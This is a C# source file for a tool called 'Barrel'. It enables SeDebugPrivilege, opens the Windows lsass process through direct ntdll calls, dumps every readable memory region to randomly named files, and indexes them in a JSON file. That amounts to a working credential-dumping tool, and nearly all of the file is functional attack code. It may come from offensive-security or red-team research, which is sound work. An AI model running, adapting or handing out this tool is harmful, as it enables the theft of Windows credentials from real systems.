﻿using System;
using System.Linq;
using System.Diagnostics;
using System.Runtime.InteropServices;


namespace Barrel
{
    internal class Program
    {
        public const int MEM_COMMIT = 0x00001000;
        public const int PAGE_NOACCESS = 0x01;
        public const uint PROCESS_QUERY_INFORMATION = 0x0400;
        public const uint PROCESS_VM_READ = 0x0010;
        public const uint MemoryBasicInformation = 0;
        public const uint OBJ_CASE_INSENSITIVE = 0x00000040;
        public const uint FileAccess_FILE_GENERIC_WRITE = 0x120116;
        public const uint FileAttributes_Normal = 128;
        public const uint FileShare_Write = 2;
        public const uint CreationDisposition_FILE_OVERWRITE_IF = 5;
        public const uint CreateOptionFILE_SYNCHRONOUS_IO_NONALERT = 32;
        public const uint TOKEN_QUERY = 0x00000008;
        public const uint TOKEN_ADJUST_PRIVILEGES = 0x00000020;


        [DllImport("ntdll.dll")]
        public static extern uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID processId);

        [DllImport("ntdll.dll")]
        public static extern bool NtReadVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("ntdll.dll")]
        public static extern uint NtQueryVirtualMemory(IntPtr hProcess, IntPtr lpAddress, uint MemoryInformationClass, out MEMORY_BASIC_INFORMATION MemoryInformation, uint MemoryInformationLength, out uint ReturnLength);

        [DllImport("ntdll.dll")]
        public static extern void RtlInitUnicodeString(out UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtCreateFile(out IntPtr FileHadle, uint DesiredAcces, ref OBJECT_ATTRIBUTES ObjectAttributes, ref IO_STATUS_BLOCK IoStatusBlock, ref long AllocationSize, uint FileAttributes, uint ShareAccess, uint CreateDisposition, uint CreateOptions, IntPtr EaBuffer, uint EaLength);

        [DllImport("ntdll.dll")]
        public static extern uint NtWriteFile(IntPtr FileHandle, IntPtr Event, IntPtr ApcRoutine, IntPtr ApcContext, ref IO_STATUS_BLOCK IoStatusBlock, byte[] Buffer, uint Length, IntPtr ByteOffset, IntPtr Key);

        [DllImport("ntdll.dll")]
        public static extern uint NtOpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, ref IntPtr TokenHandle);

        [DllImport("ntdll.dll")]
        public static extern uint NtAdjustPrivilegesToken(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [DllImport("ntdll.dll")]
        public static extern uint NtClose(IntPtr hObject);


        public struct MEMORY_BASIC_INFORMATION
        {
            public IntPtr BaseAddress;
            public IntPtr AllocationBase;
            public int AllocationProtect;
            public IntPtr RegionSize;
            public int State;
            public int Protect;
            public int Type;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct IO_STATUS_BLOCK
        {
            public uint status;
            public IntPtr information;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }


        static void EnableDebugPrivileges()
        {
            IntPtr currentProcess = Process.GetCurrentProcess().Handle;
            IntPtr tokenHandle = IntPtr.Zero;
            try
            {
                uint ntstatus = NtOpenProcessToken(currentProcess, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ref tokenHandle);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtOpenProcessToken. NTSTATUS: 0x" + ntstatus.ToString("X"));
                    Environment.Exit(-1);
                }

                TOKEN_PRIVILEGES tokenPrivileges = new TOKEN_PRIVILEGES
                {
                    PrivilegeCount = 1,
                    Luid = new LUID { LowPart = 20, HighPart = 0 }, // LookupPrivilegeValue(null, "SeDebugPrivilege", ref luid);
                    Attributes = 0x00000002
                };

                ntstatus = NtAdjustPrivilegesToken(tokenHandle, false, ref tokenPrivileges, (uint)Marshal.SizeOf(typeof(TOKEN_PRIVILEGES)), IntPtr.Zero, IntPtr.Zero);
                if (ntstatus != 0)
                {
                    Console.WriteLine("[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x" + ntstatus.ToString("X") + ". Maybe you need to calculate the LowPart of the LUID using LookupPrivilegeValue");
                    Environment.Exit(-1);
                }
            }
            finally
            {
                if (tokenHandle != IntPtr.Zero)
                {
                    NtClose(tokenHandle);
                }
            }
        }


        static void WriteToFile(byte[] buffer, int bufferSize, string filename)
        {
            // Create to file
            IntPtr hFile;
            UNICODE_STRING fname = new UNICODE_STRING();
            string current_dir = System.IO.Directory.GetCurrentDirectory();
            RtlInitUnicodeString(out fname, @"\??\" + current_dir + "\\" + filename);
            IntPtr objectName = Marshal.AllocHGlobal(Marshal.SizeOf(fname));
            Marshal.StructureToPtr(fname, objectName, true);
            OBJECT_ATTRIBUTES FileObjectAttributes = new OBJECT_ATTRIBUTES
            {
                Length = (int)Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES)),
                RootDirectory = IntPtr.Zero,
                ObjectName = objectName,
                Attributes = OBJ_CASE_INSENSITIVE,
                SecurityDescriptor = IntPtr.Zero,
                SecurityQualityOfService = IntPtr.Zero
            };
            IO_STATUS_BLOCK IoStatusBlock = new IO_STATUS_BLOCK();
            long allocationSize = 0;
            uint ntstatus = NtCreateFile(
                out hFile,
                FileAccess_FILE_GENERIC_WRITE,
                ref FileObjectAttributes,
                ref IoStatusBlock,
                ref allocationSize,
                FileAttributes_Normal, // 0x80 = 128 https://learn.microsoft.com/es-es/dotnet/api/system.io.fileattributes?view=net-7.0
                FileShare_Write, // 2 - https://learn.microsoft.com/en-us/dotnet/api/system.io.fileshare?view=net-8.0
                CreationDisposition_FILE_OVERWRITE_IF, // 5 - https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
                CreateOptionFILE_SYNCHRONOUS_IO_NONALERT, // 32 -  https://code.googlesource.com/bauxite/+/master/sandbox/win/src/nt_internals.h
                IntPtr.Zero,
                0
            );
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Calling NtOpenFile failed.");
                Environment.Exit(0);
            }

            // Write to file
            ntstatus = NtWriteFile(hFile, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref IoStatusBlock, buffer, (uint)bufferSize, IntPtr.Zero, IntPtr.Zero);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Calling NtWriteFile failed.");
                Environment.Exit(0);
            }
        }


        static string getRandomString(int length, Random random)
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";
            System.Text.StringBuilder stringBuilder = new System.Text.StringBuilder();
            for (int i = 0; i < length; i++)
            {
                int index = random.Next(chars.Length);
                stringBuilder.Append(chars[index]);
            }
            return stringBuilder.ToString();
        }


        public static string ToJson(string[] array)
        {
            string json_str = "{";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += "\"field" + i.ToString() + "\" : \"" + array[i] + "\" , ";
            }
            return (json_str.Substring(0, json_str.Length - 3) + "}");
        }


        public static string ToJsonArray(string[] array)
        {
            string json_str = "[";
            for (int i = 0; i < array.Length; i++)
            {
                json_str += array[i] + ", ";
            }
            return (json_str.Substring(0, json_str.Length - 2) + "]");
        }


        static void WriteToFile(string path, string content)
        {
            System.IO.File.WriteAllText(path, content);
            Console.WriteLine("[+] JSON file generated.");
        }


        static void Main(string[] args)
        {
            Console.WriteLine("3 - Barrel");
            Random random = new Random();

            // Create directory for all dump files
            string path_ = @"" + getRandomString(5, random) + "\\";
            if (!System.IO.Directory.Exists(path_))
            {
                System.IO.Directory.CreateDirectory(path_);
                Console.WriteLine("[+] Files will be created at " + path_);
            }

            // Get process name
            string procname = "lsass";

            //Get process PID
            Process[] process_list = Process.GetProcessesByName(procname);
            if (process_list.Length == 0)
            {
                Console.WriteLine("[-] Process " + procname + " not found.");
                Environment.Exit(0);
            }
            int processPID = process_list[0].Id;
            Console.WriteLine("[+] Process PID: \t\t\t\t" + processPID);

            // Get SeDebugPrivilege
            EnableDebugPrivileges();

            // Get process handle with NtOpenProcess
            IntPtr processHandle = IntPtr.Zero;
            CLIENT_ID client_id = new CLIENT_ID();
            client_id.UniqueProcess = (IntPtr)processPID;
            client_id.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            uint ntstatus = NtOpenProcess(ref processHandle, PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, ref objAttr, ref client_id);
            if (ntstatus != 0)
            {
                Console.WriteLine("[-] Error calling NtOpenProcess. NTSTATUS: 0x" + ntstatus.ToString("X"));
            }
            Console.WriteLine("[+] Process handle:  \t\t\t\t" + processHandle);

            // Loop the memory regions
            long proc_max_address_l = (long)0x7FFFFFFEFFFF;
            IntPtr aux_address = IntPtr.Zero;
            // byte[] aux_bytearray = { };
            string[] aux_array_1 = { };
            while ((long)aux_address < proc_max_address_l)
            {
                // Populate MEMORY_BASIC_INFORMATION struct calling VirtualQueryEx/NtQueryVirtualMemory
                MEMORY_BASIC_INFORMATION mbi = new MEMORY_BASIC_INFORMATION();
                NtQueryVirtualMemory(processHandle, aux_address, MemoryBasicInformation, out mbi, 0x30, out _);

                // If readable and committed -> Write memory region to a file
                if (mbi.Protect != PAGE_NOACCESS && mbi.State == MEM_COMMIT)
                {
                    byte[] buffer = new byte[(int)mbi.RegionSize];
                    NtReadVirtualMemory(processHandle, mbi.BaseAddress, buffer, (int)mbi.RegionSize, out _);
                    // Create dump file for this region
                    string memdump_filename = getRandomString(10, random) + "." + getRandomString(3, random);
                    WriteToFile(buffer, (int)mbi.RegionSize, (path_ + memdump_filename));
                    // Add to JSON file                    
                    string[] aux_array_2 = { memdump_filename, "0x" + aux_address.ToString("X"), mbi.RegionSize.ToString() };
                    aux_array_1 = aux_array_1.Concat(new string[] { ToJson(aux_array_2) }).ToArray();
                }
                // Next memory region
                aux_address = (IntPtr)((ulong)aux_address + (ulong)mbi.RegionSize);
            }

            string barrel_json_content = ToJsonArray(aux_array_1);
            WriteToFile("barrel.json", barrel_json_content);
        }
    }
}